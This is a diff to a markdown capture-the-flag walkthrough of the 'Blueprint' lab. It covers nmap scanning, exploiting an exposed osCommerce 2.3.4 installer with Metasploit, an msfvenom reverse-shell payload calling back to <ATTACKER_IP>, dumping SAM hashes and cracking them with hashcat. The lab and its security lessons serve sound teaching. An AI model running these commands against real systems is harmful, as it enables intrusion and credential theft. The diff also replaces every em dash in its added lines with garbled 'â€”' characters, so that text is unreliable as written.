@@ -51,8 +51,8 @@ echo "$TARGET blueprint.thm" | sudo tee -a /etc/hosts
 
 ### Port Discovery
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan on the target IP.
+# Why here: identify all active services, revealing a large attack surface including unusual ports like 8080 and 49152+.
 nmap -sS -p- --min-rate 5000 -n $TARGET
 ```
 
@@ -60,8 +60,8 @@ nmap -sS -p- --min-rate 5000 -n $TARGET
 
 ### Service Enumeration
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: perform deep service version detection and run default scripts on all discovered ports.
+# Why here: fingerprint the XAMPP stack and confirm the presence of osCommerce via HTTP headers and page content.
 nmap -sVC -p53,80,88,135,139,443,445,3306,8080,49152,49153,49154,49160,49164,49165 $TARGET -oA service-scan
 ```
 
@@ -87,7 +87,7 @@ Key indicator: osCommerce 2.3.4 is known to be vulnerable when the `/install/` d
 https://blueprint.thm/oscommerce-2.3.4/catalog/install/index.php
 ```
 
-The install wizard is publicly reachable — unauthenticated RCE is in play via the installer's configuration write step.
+The install wizard is publicly reachable â€” unauthenticated RCE is in play via the installer's configuration write step.
 
 ---
 
@@ -98,8 +98,8 @@ The install wizard is publicly reachable — unauthenticated RCE is in play via th
 There is a public Metasploit module that abuses the exposed installer to write PHP to the `configure.php` file and gain code execution.
 
 ```bash
-# What it does: usa herramientas de Metasploit para preparar exploit o payload.
-# Why here: generar o lanzar el payload necesario.
+# What it does: start the Metasploit console to prepare the osCommerce exploit.
+# Why here: leverage the public unauthenticated RCE in the osCommerce installer directory for initial access.
 msfconsole
 ```
 
@@ -121,8 +121,8 @@ A session drops as **NT AUTHORITY\SYSTEM**, but the session is fragile (single-r
 In a second terminal, generate a native Meterpreter payload:
 
 ```bash
-# What it does: usa herramientas de Metasploit para preparar exploit o payload.
-# Why here: generar o lanzar el payload necesario.
+# What it does: generate a standalone Windows Meterpreter reverse TCP payload.
+# Why here: provide a stable and full-featured shell to replace the fragile web shell wrapper from the initial exploit.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=3333 -f exe > shell.exe
 ```
 
@@ -159,7 +159,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-Drop to a Windows shell only when needed (`shell`) — staying in Meterpreter gives us the built-in `hashdump`.
+Drop to a Windows shell only when needed (`shell`) â€” staying in Meterpreter gives us the built-in `hashdump`.
 
 ---
 
@@ -187,12 +187,12 @@ The LM portion is blank (standard on modern Windows); the NT hash is what we cra
 Submit the NT hash to [crackstation.net](https://crackstation.net) or run it locally:
 
 ```bash
-# What it does: cracks hashes with the specified mode and wordlist.
-# Why here: recuperar credenciales o confirmar que no estan en la lista.
+# What it does: crack the captured NTLM hashes using Hashcat.
+# Why here: recover the cleartext Administrator password to confirm the host compromise and potentially reuse credentials.
 hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-The password cracks quickly — it is a rockyou-range password.
+The password cracks quickly â€” it is a rockyou-range password.
 
 ---
 
@@ -220,13 +220,11 @@ Or from the recovered cleartext password, authenticate cleanly via RDP / WinRM /
 
 ### Security Lessons
 
-1. **Never leave installer directories on production** — osCommerce, phpMyAdmin, phpBB all ship install wizards that must be removed post-deploy.
-2. **Patch legacy CMS versions** — osCommerce 2.3.4 is end-of-life; public Metasploit modules exist.
-3. **Isolate XAMPP from production** — default XAMPP on Windows runs everything as SYSTEM, turning web RCE into a full host compromise.
-4. **Enforce strong Administrator passwords** — once SAM hashes are dumped, weak passwords fall in seconds.
+1. **Never leave installer directories on production** â€” osCommerce, phpMyAdmin, phpBB all ship install wizards that must be removed post-deploy.
+2. **Patch legacy CMS versions** â€” osCommerce 2.3.4 is end-of-life; public Metasploit modules exist.
+3. **Isolate XAMPP from production** â€” default XAMPP on Windows runs everything as SYSTEM, turning web RCE into a full host compromise.
+4. **Enforce strong Administrator passwords** â€” once SAM hashes are dumped, weak passwords fall in seconds.
 
 ### Related Notes
-- [metasploit](../../tools/exploitation/metasploit.md) — module delivery
-- [hashcat](../../tools/creds/hashcat.md) — NTLM cracking mode `-m 1000`
-
-
+- [metasploit](../../tools/exploitation/metasploit.md) â€” module delivery
+- [hashcat](../../tools/creds/hashcat.md) â€” NTLM cracking mode `-m 1000`
